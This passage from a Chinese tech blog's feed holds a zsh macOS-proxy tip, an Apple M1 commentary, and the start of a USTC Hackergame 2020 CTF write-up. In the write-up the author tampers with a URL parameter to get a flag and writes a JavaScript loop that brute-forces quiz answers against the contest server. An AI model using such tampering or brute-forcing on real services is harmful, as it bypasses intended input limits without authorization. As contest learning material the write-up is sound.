的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  